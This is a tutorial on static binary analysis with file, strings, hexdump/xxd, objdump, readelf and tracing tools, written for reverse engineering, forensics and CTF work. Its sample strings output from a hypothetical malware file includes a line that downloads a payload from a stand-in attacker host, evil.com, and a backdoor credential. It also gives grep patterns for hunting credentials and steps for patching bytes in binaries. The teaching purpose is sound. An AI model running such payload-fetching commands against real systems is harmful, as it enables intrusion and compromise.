---
title: "Binary Analysis (file, strings, hexdump, objdump)"
date: "2026-05-11"
---

Binary analysis is a fundamental skill in reverse engineering, forensics, and CTF challenges. Four tools - `file`, `strings`, `hexdump`, `objdump` - let you understand what a file is, what it contains, and how it is structured, all without executing it.

---

## Why Analyze Binaries

Before running an unknown file or investigating malware, you need to know:

- What kind of file it actually is (executable, library, archive, data)
- Which architecture and OS it was compiled for
- What strings and clues it contains
- What functions it imports and exports
- What its sections and headers look like

All of this can be done statically - without executing the file.

---

## file - identify file type

`file` reads the signature (magic bytes) at the beginning of a file and determines its type. It does not trust file extensions.

### Basic usage

```bash
file binary
file /bin/ls
file /usr/lib/libssl.so
file /etc/passwd
file archive.tar.gz
file image.png
```

### Example output

```bash
file /bin/ls
# /bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
#          dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
#          BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped

file /bin/bash
# /bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
#            dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
#            for GNU/Linux 3.2.0, with debug_info, not stripped

file /etc/passwd
# /etc/passwd: ASCII text

file archive.tar.gz
# archive.tar.gz: gzip compressed data, from Unix

file image.png
# image.png: PNG image data, 1920 x 1080, 8-bit/color RGBA, non-interlaced

file document.pdf
# document.pdf: PDF document, version 1.7

file unknown_file
# unknown_file: data
```

### Decoding ELF output

```
ELF 64-bit LSB pie executable, x86-64
│   │       │   │   │           └── processor architecture
│   │       │   │   └──────────── object type (executable, shared object, relocatable)
│   │       │   └──────────────── Position Independent Executable
│   │       └──────────────────── Little/Big Endian (byte order)
│   └──────────────────────────── bitness
└──────────────────────────────── file format (Executable and Linkable Format)

dynamically linked   - depends on external libraries (.so / .dll)
statically linked    - everything compiled in, no external dependencies
stripped             - symbol table removed (harder to reverse)
not stripped         - symbols present (function and variable names)
with debug_info      - DWARF debug information included
```

### file flags

```bash
file -b binary         # brief output, no filename prefix
file -i binary         # MIME type instead of text description
file -z binary         # look inside compressed files
file -L binary         # follow symbolic links
file -s /dev/sda       # special files (block devices)
file *                 # all files in directory
file -f list.txt       # read filenames from a file

# MIME type
file -i /bin/ls
# /bin/ls: application/x-executable; charset=binary

file -i image.png
# image.png: image/png; charset=binary
```

### Magic bytes - how file detects types

```bash
# file reads the first bytes and matches them against /usr/share/misc/magic
# Common signatures:

# ELF:  7f 45 4c 46  (0x7f 'E' 'L' 'F')
# PNG:  89 50 4e 47 0d 0a 1a 0a  (89 PNG \r\n ^Z \n)
# ZIP:  50 4b 03 04  ('P' 'K' 0x03 0x04)
# PDF:  25 50 44 46  ('%PDF')
# gzip: 1f 8b
# 7z:   37 7a bc af 27 1c

xxd binary | head -2    # manually inspect the first bytes
```

---

## strings - extract printable strings

`strings` finds all printable character sequences in a binary file. Default minimum length is 4 characters.

### Basic usage

```bash
strings binary
strings /bin/ls
strings /usr/sbin/sshd
strings malware.bin
```

### What you can find

```bash
strings malware.bin
# /bin/sh                    - shell invocation
# /etc/passwd                - password file access
# wget http://evil.com/payload  - downloading something
# BACKDOOR_PASSWORD          - hardcoded credential
# SELECT * FROM users        - SQL query
# UPX!                       - UPX packer marker
# Copyright 2024 MalwareCorp - compiler metadata
# Mozilla/5.0                - User-Agent for masquerading
```

### strings flags

```bash
strings -n 8 binary        # minimum string length 8 (default 4)
strings -t x binary        # print hex offset before each string
strings -t d binary        # offset in decimal
strings -t o binary        # offset in octal
strings -a binary          # scan entire file (not just .data section)
strings -e l binary        # UTF-16 LE strings (Windows wide strings)
strings -e b binary        # UTF-16 BE strings
strings -f binary          # print filename before each string

# With offsets (useful for locating strings)
strings -t x /bin/ls | head -20
# 0x1234  /lib64/ld-linux-x86-64.so.2
# 0x1250  libselinux.so.1
```

### Practical patterns

```bash
# Find URLs
strings binary | grep -E 'https?://'

# Find IP addresses
strings binary | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'

# Find email addresses
strings binary | grep -E '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

# Find Unix paths
strings binary | grep -E '^/[a-z]'

# Find Windows paths
strings -e l binary | grep -E '^[A-Z]:\\'

# Find Base64 blobs
strings binary | grep -E '^[A-Za-z0-9+/]{20,}={0,2}$'

# Find hardcoded credentials
strings binary | grep -iE 'password|passwd|secret|key|token|api'

# Strings with offsets, filtered
strings -t x binary | grep -i password

# List imported libraries
strings binary | grep '\.so\.'
strings binary | grep '\.dll'
```

### Limitations of strings

```bash
# strings has no context - it outputs any ASCII sequence
# Filter out noise:
strings binary | grep -v '^[^a-zA-Z]*$'     # require at least one letter
strings binary | awk 'length > 8'            # only longer strings

# If the file is packed (UPX, obfuscated) - strings shows little
file binary | grep -i upx     # check for packing
strings binary | grep UPX     # UPX leaves a marker
# Unpack first: upx -d binary
```

---

## hexdump - view raw hex

`hexdump` (and its alternative `xxd`) displays file contents in hexadecimal. Essential for analyzing binary protocols, headers, and searching for byte patterns.

### Basic usage

```bash
hexdump file               # standard output
hexdump -C file            # hex + ASCII on the right (most readable)
xxd file                   # alternative with similar format
xxd -l 64 file             # only the first 64 bytes
```

### hexdump -C - the main mode

```bash
hexdump -C /bin/ls | head -5
# 00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
# 00000010  03 00 3e 00 01 00 00 00  d0 6e 00 00 00 00 00 00  |..>......n......|
# 00000020  40 00 00 00 00 00 00 00  90 28 01 00 00 00 00 00  |@........(......|
# 00000030  00 00 00 00 40 00 38 00  0d 00 40 00 1e 00 1d 00  |....@.8...@.....|
#
# Left column:   file offset (hex)
# Middle columns: 16 bytes in hex (split in half by a space)
# Right column:  ASCII representation (dot = non-printable byte)
```

### hexdump flags

```bash
hexdump -C file            # hex + ASCII (canonical format)
hexdump -x file            # output in two-byte words
hexdump -d file            # in decimal
hexdump -o file            # in octal
hexdump -b file            # one byte per column in octal

# Limit output
hexdump -C -n 256 file     # first 256 bytes
hexdump -C -s 0x100 file   # start at byte 0x100
hexdump -C -s 512 -n 128 file  # 128 bytes starting at byte 512
```

### xxd - the powerful alternative

```bash
xxd file                   # standard output
xxd -l 32 file             # first 32 bytes
xxd -s 0x40 file           # start at 0x40
xxd -s -16 file            # last 16 bytes (from end)
xxd -c 8 file              # 8 bytes per line instead of 16
xxd -g 1 file              # group by 1 byte
xxd -g 4 file              # group by 4 bytes
xxd -p file                # raw hex without formatting (plain dump)
xxd -r file                # reverse: convert hex dump back to binary
xxd -u file                # uppercase hex digits

# Inspect ELF magic bytes
xxd -l 16 /bin/ls
# 00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
#             ^ ELF signature

# Extract a section and convert
xxd -s 0x40 -l 64 -p binary | tr -d '\n'  # raw hex string
```

### Practical hexdump tasks

```bash
# Search for a byte pattern
xxd binary | grep '4142 4344'   # search for "ABCD"

# Compare two files
diff <(xxd file1) <(xxd file2)

# Patch a single byte
# 1. Find the offset
xxd binary | grep -n 'pattern'
# 2. Apply the patch
printf '\xNN' | dd of=binary bs=1 seek=OFFSET conv=notrunc
# Or with xxd:
cp binary binary.bak
echo "OFFSET: XX" | xxd -r - binary  # OFFSET in hex, XX is the new byte

# Inspect PNG header
xxd -l 16 image.png
# 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR

# View the ELF header (first 64 bytes)
xxd -l 64 /bin/ls

# Find a string as hex
echo -n "password" | xxd -p
# 70617373776f7264
xxd binary | grep '70617373'

# Extract a segment
dd if=binary of=extracted.bin bs=1 skip=1024 count=512
xxd extracted.bin
```

### ELF header structure in hexdump

```bash
xxd -l 64 /bin/ls
# 00000000: 7f45 4c46  - Magic: .ELF
# 00000004: 02         - Class: 64-bit  (01=32bit, 02=64bit)
# 00000005: 01         - Data: LSB      (01=little endian, 02=big endian)
# 00000006: 01         - Version: 1
# 00000007: 00         - OS/ABI: ELFOSABI_NONE (System V)
# 00000010: 0300       - Type: ET_DYN   (PIE executable / shared object)
# 00000012: 3e00       - Machine: x86-64 (0x3e)
# 00000018: xxxx       - Entry point address
# 00000020: xxxx       - Program header offset
# 00000028: xxxx       - Section header offset
```

---

## objdump - disassembler and ELF analysis

`objdump` is a powerful tool for analyzing object files and ELF executables: it shows headers, sections, symbols, and disassembles code.

### Basic usage

```bash
objdump -f binary          # brief file info
objdump -h binary          # section headers
objdump -d binary          # disassemble code sections
objdump -D binary          # disassemble everything
objdump -t binary          # symbol table
objdump -T binary          # dynamic symbol table
objdump -p binary          # program headers (segments)
objdump -x binary          # all headers combined
```

### File information

```bash
objdump -f /bin/ls
# /bin/ls:     file format elf64-x86-64
# architecture: i386:x86-64, flags 0x00000150:
# HAS_SYMS, DYNAMIC, D_PAGED
# start address 0x0000000000006ed0

# Flags:
# HAS_SYMS  - symbol table present
# DYNAMIC   - dynamically linked
# D_PAGED   - paged addressing
```

### Sections (-h)

```bash
objdump -h /bin/ls
# Sections:
# Idx Name          Size      VMA               LMA               File off  Algn
#   0 .interp       0000001c  0000000000000318  ...
#  14 .text         00012345  0000000000006ed0  ...
#  25 .data         00000120  0000000000024000  ...
#  26 .bss          00000400  0000000000024120  ...
```

| Section | Contents |
| --- | --- |
| `.text` | Executable code |
| `.data` | Initialized global variables |
| `.bss` | Uninitialized global variables |
| `.rodata` | Read-only constants and string literals |
| `.plt` | Procedure Linkage Table (for dynamic calls) |
| `.got` | Global Offset Table (addresses of external functions) |
| `.got.plt` | GOT for PLT |
| `.interp` | Path to the dynamic linker |
| `.dynamic` | Dynamic linking information |
| `.symtab` | Symbol table |
| `.strtab` | String table (symbol names) |
| `.debug_*` | DWARF debug information |

### Disassembly (-d and -D)

```bash
# Disassemble only code sections
objdump -d binary

# Disassemble everything (including data interpreted as code)
objdump -D binary

# Intel syntax instead of AT&T (more readable for most people)
objdump -d -M intel binary

# With symbol names
objdump -d --no-show-raw-insn binary

# A specific function (via grep)
objdump -d -M intel binary | grep -A 50 '<main>:'
objdump -d -M intel binary | grep -A 20 '<check_password>:'

# Interleave source code (requires debug_info)
objdump -d -S binary

# Save to file
objdump -d -M intel binary > disasm.txt
```

### Disassembly example

```bash
objdump -d -M intel /bin/cat | grep -A 30 '<main>:'
# 0000000000002c10 <main>:
#     2c10: 41 57                 push   r15
#     2c12: 41 56                 push   r14
#     2c14: 41 55                 push   r13
#     2c16: 41 54                 push   r12
#     2c18: 55                    push   rbp
#     2c19: 53                    push   rbx
#     2c1a: 48 83 ec 58           sub    rsp,0x58
#     2c1e: 89 fb                 mov    ebx,edi        ; argc
#     2c20: 48 89 f5              mov    rbp,rsi        ; argv
#     ...
#     2c45: e8 b6 fb ff ff        call   2800 <fopen@plt>
#
# Line format:
# ADDRESS: BYTES  MNEMONIC  OPERANDS
```

### Symbol table (-t and -T)

```bash
# Static symbol table (if not stripped)
objdump -t binary
# SYMBOL TABLE:
# 0000000000000000 l    df *ABS*  0000000000000000 crtstuff.c
# 0000000000006ed0 g    F .text  0000000000000023 _start
# 0000000000006f00 g    F .text  000000000000015c main
# 0000000000008090 g    F .text  00000000000000a0 check_password
#
# Format: ADDRESS  FLAGS  SECTION  SIZE  NAME
# Flags: l=local, g=global, F=function, O=object, f=file

# Dynamic symbol table (imports / exports)
objdump -T /bin/ls
# DYNAMIC SYMBOL TABLE:
# 0000000000000000  w   D  *UND*  0000000000000000  GLIBC_2.2.5 free
# 0000000000000000  w   D  *UND*  0000000000000000  GLIBC_2.2.5 fclose
# 0000000000000000  w   D  *UND*  0000000000000000  GLIBC_2.2.5 opendir

# List all functions in the binary
objdump -t binary | grep ' F '

# Only global functions
objdump -t binary | grep 'g.*F'
```

### Program headers (-p)

```bash
objdump -p /bin/ls
# Program Header:
#     PHDR off    0x0000000000000040 vaddr ...
#   INTERP off    0x0000000000000318 vaddr ...
#     LOAD off    0x0000000000000000 vaddr ...
#     LOAD off    0x0000000000023000 vaddr ...
#  DYNAMIC off    0x0000000000023e58 vaddr ...

# Library dependencies
objdump -p binary | grep NEEDED
# NEEDED               libselinux.so.1
# NEEDED               libc.so.6
```

### Useful combinations

```bash
# Full binary analysis
objdump -x binary

# Find all call instructions
objdump -d -M intel binary | grep 'call'

# Find calls to a specific function
objdump -d -M intel binary | grep 'call.*printf'

# View .rodata section (string literals)
objdump -s -j .rodata binary

# View .data section
objdump -s -j .data binary

# Find a function's address
objdump -t binary | grep 'main'

# Disassemble only .plt (for import analysis)
objdump -d -j .plt -M intel binary

# Section sizes
objdump -h binary | awk '/Idx/{next} {print $2, $3}' | sort -k2 -rh
```

---

## readelf - detailed ELF header analysis

`readelf` specializes exclusively in the ELF format and provides more detail than `objdump`.

```bash
readelf -h binary          # ELF header
readelf -l binary          # program headers (segments)
readelf -S binary          # section headers
readelf -s binary          # symbol table
readelf -d binary          # dynamic section
readelf -r binary          # relocation table
readelf -a binary          # everything at once
readelf -n binary          # note sections (build ID etc.)
readelf -W binary          # wide output (no line wrapping)

# ELF header
readelf -h /bin/ls
# ELF Header:
#   Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
#   Class:                             ELF64
#   Data:                              2's complement, little endian
#   Type:                              DYN (Position-Independent Executable file)
#   Machine:                           Advanced Micro Devices X86-64
#   Entry point address:               0x6ed0

# Dynamic dependencies
readelf -d binary | grep NEEDED
# 0x0000000000000001 (NEEDED)  Shared library: [libselinux.so.1]
# 0x0000000000000001 (NEEDED)  Shared library: [libc.so.6]

# Security features (stack canary)
readelf -s binary | grep -i 'canary\|stack_chk'
```

---

## ltrace and strace - call tracing

```bash
# ltrace - intercept library function calls
ltrace ./binary
# strcmp(0x7fff..., "admin", "password") = -1
# printf("Wrong password\n")  = 16

ltrace -e strcmp ./binary          # only strcmp
ltrace -e 'str*' ./binary          # all functions starting with str

# strace - intercept system calls
strace ./binary
strace -e openat,read,write ./binary    # specific syscalls
strace -f ./binary                       # follow child processes
strace -o output.txt ./binary           # save to file

# What files does the program open?
strace -e openat ./binary 2>&1 | grep -v 'ENOENT'

# Network system calls
strace -e trace=network ./binary
```

---

## nm - symbols in object files

```bash
nm binary                  # all symbols
nm -D binary               # dynamic symbols
nm -u binary               # undefined (imports)
nm -n binary               # sort by address
nm -S binary               # show symbol size

# Symbol types in nm:
# T/t - .text (code), global/local
# D/d - .data (initialized data)
# B/b - .bss (uninitialized data)
# R/r - .rodata (constants)
# U   - undefined (external dependency)
# W/w - weak symbol

# Find a function
nm -D binary | grep malloc
nm binary | grep main
```

---

## ldd - library dependencies

```bash
ldd binary                 # list shared libraries
ldd -v binary              # verbose with symbol versions
ldd -u binary              # unused dependencies

ldd /bin/ls
# linux-vdso.so.1 (0x00007fff...)
# libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x...)
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x...)
# /lib64/ld-linux-x86-64.so.2 (0x...)

# Warning: do NOT run ldd on untrusted binaries!
# ldd executes the binary to determine dependencies.
# Safe alternatives:
objdump -p binary | grep NEEDED
readelf -d binary | grep NEEDED
```

---

## Typical analysis workflow

### Step 1 - what is it?

```bash
file unknown_file
# ELF 64-bit, dynamically linked, stripped
```

### Step 2 - dependencies and security

```bash
objdump -p unknown_file | grep NEEDED   # libraries
readelf -h unknown_file                  # ELF header
checksec --file=unknown_file             # NX, PIE, canary, RELRO
```

### Step 3 - strings and artifacts

```bash
strings -t x unknown_file | grep -iE 'http|password|cmd|exec|/bin/sh'
strings -n 6 unknown_file | sort -u
```

### Step 4 - sections and symbols

```bash
objdump -h unknown_file                  # sections
objdump -t unknown_file                  # symbols (if not stripped)
objdump -T unknown_file                  # dynamic symbols
```

### Step 5 - disassembly

```bash
objdump -d -M intel unknown_file > disasm.txt
grep -n 'call\|jmp\|cmp' disasm.txt | head -50
```

### Step 6 - tracing (in a safe environment)

```bash
strace ./unknown_file 2>&1 | head -50
ltrace ./unknown_file 2>&1 | head -50
```

---

## Cheat sheet - quick reference

| Task | Command |
| --- | --- |
| Identify file type | `file binary` |
| Magic bytes | `xxd -l 16 binary` |
| All strings | `strings binary` |
| Strings with offsets | `strings -t x binary` |
| Find URLs | `strings binary \| grep -E 'https?://'` |
| Hex view | `xxd binary \| head` |
| Specific byte range | `xxd -s 0x40 -l 64 binary` |
| ELF sections | `objdump -h binary` |
| Disassemble | `objdump -d -M intel binary` |
| Specific function | `objdump -d -M intel binary \| grep -A30 '<main>:'` |
| Symbols | `objdump -t binary` |
| Imports | `objdump -T binary` |
| Dependencies | `objdump -p binary \| grep NEEDED` |
| ELF header | `readelf -h binary` |
| Full ELF info | `readelf -a binary` |
| Undefined symbols | `nm -u binary` |
| System calls | `strace binary` |
| Library calls | `ltrace binary` |

---

## References

- [file man page](https://man7.org/linux/man-pages/man1/file.1.html) - `man file`
- [strings man page](https://man7.org/linux/man-pages/man1/strings.1.html) - `man strings`
- [hexdump man page](https://man7.org/linux/man-pages/man1/hexdump.1.html) - `man hexdump`
- [xxd man page](https://linux.die.net/man/1/xxd) - `man xxd`
- [objdump man page](https://man7.org/linux/man-pages/man1/objdump.1.html) - `man objdump`
- [readelf man page](https://man7.org/linux/man-pages/man1/readelf.1.html) - `man readelf`
- [ELF format specification](https://refspecs.linuxfoundation.org/elf/elf.pdf)
- [ELF Linux man page](https://man7.org/linux/man-pages/man5/elf.5.html) - `man 5 elf`
